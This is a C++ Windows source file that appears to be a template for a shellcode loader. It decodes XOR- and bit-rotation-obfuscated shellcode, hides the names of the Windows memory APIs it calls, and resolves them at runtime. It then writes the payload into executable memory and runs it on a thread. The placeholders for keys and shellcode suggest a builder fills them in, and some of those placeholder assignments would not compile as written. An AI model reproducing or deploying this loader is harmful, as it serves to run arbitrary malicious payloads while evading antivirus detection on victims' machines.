#include <Windows.h>
#include <thread>
#include <iostream>



unsigned char circshift(unsigned char x, int n) {
	return (x >> n) | (x << (8 - n) & 0xFF);
}

void decode_shellcode(unsigned char shellcode[], int size, unsigned char key, unsigned char key2, int shift) {

	for (int x = 0; x < size; x++) {

		shellcode[x] = circshift((shellcode[x] ^ key), shift) ^ key2;
		//std::cout << (shellcode[x]);

	}



	return;

}

void decode_string(unsigned char* key, unsigned char* text, int size) {

	for (int x = 0; x < size; x++) {

		text[x] = text[x] ^ key[x];

	}

	return;
}

FARPROC load_func(LPCWSTR lib, LPCSTR function) {
	HMODULE hDLL = GetModuleHandle(L"kernel32");
	FARPROC x = GetProcAddress(hDLL, function);
	return x;
}

void exec(char* memory) {

	((void(*)())memory)();


}

void doShit() {

	HANDLE(WINAPI * OpenProcess)(DWORD, BOOL, DWORD);
	LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	BOOL(WINAPI * WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
	BOOL(WINAPI * CloseHandle)(HANDLE);

	unsigned char key = "place_key";
	unsigned char key2 = "place_key2";
	int shift = "place_shift";
	unsigned char shellcode[] = "place_shellcode";
	unsigned char vallocx_key[] = "place_vallocx_key";
	unsigned char open_proc_key[] = "place_open_proc_key";
	unsigned char write_proc_key[] = "place_write_proc_key";
	unsigned char close_handle_key[] = "place_close_handle_key";
	unsigned char kernel32_key[] = "place_kernel32_key";
	unsigned char vallocex[] = "place_vallocex";
	unsigned char openPRC[] = "place_openPRC";
	unsigned char writePRC[] = "place_writePRC";
	unsigned char closeHandle[] = "place_closeHandle";
	unsigned char kernel32[] = "place_kernel32";


	decode_string(vallocx_key, vallocex, sizeof vallocex);
	decode_string(open_proc_key, openPRC, sizeof openPRC);
	decode_string(write_proc_key, writePRC, sizeof writePRC);
	decode_string(close_handle_key, closeHandle, sizeof closeHandle);
	decode_string(kernel32_key, kernel32, sizeof kernel32);







	(FARPROC&)VirtualAllocEx = load_func((LPCWSTR)kernel32, (LPCSTR)vallocex);
	(FARPROC&)OpenProcess = load_func((LPCWSTR)kernel32, (LPCSTR)openPRC);
	(FARPROC&)WriteProcessMemory = load_func((LPCWSTR)kernel32, (LPCSTR)writePRC);
	//(FARPROC&)CreateRemoteThread = load_func((LPCWSTR)kernel32, (LPCSTR)rmthread);
	(FARPROC&)CloseHandle = load_func((LPCWSTR)kernel32, (LPCSTR)closeHandle);


	decode_shellcode(shellcode, sizeof shellcode, key2, key, shift);

	if (shellcode != NULL) {


		HANDLE processHandle = GetCurrentProcess();
		HANDLE remoteThread;
		LPVOID buffer;

		


			

			buffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

			if (buffer != 0x0 && buffer != NULL) {


				BOOL write = WriteProcessMemory(processHandle, buffer, shellcode, sizeof shellcode, NULL);

				if (write == TRUE) {

					std::cout << "\n[*] Written shellcode to memory";

					
					CloseHandle(processHandle);
					std::cout << "\n[*] Closed handle, triggering thread";

					char* char_ptr = static_cast<char*>(buffer);

					std::thread t2(exec, char_ptr);
					t2.join();
					
					
				}
				else {

					std::cout << "\n[*] An error has creating buffer..";

				}
			}
		

	}


}




int main()
{

	std::thread t1(doShit);
	t1.join();
	std::cout << "\n[*] Done";

	return 0;
}




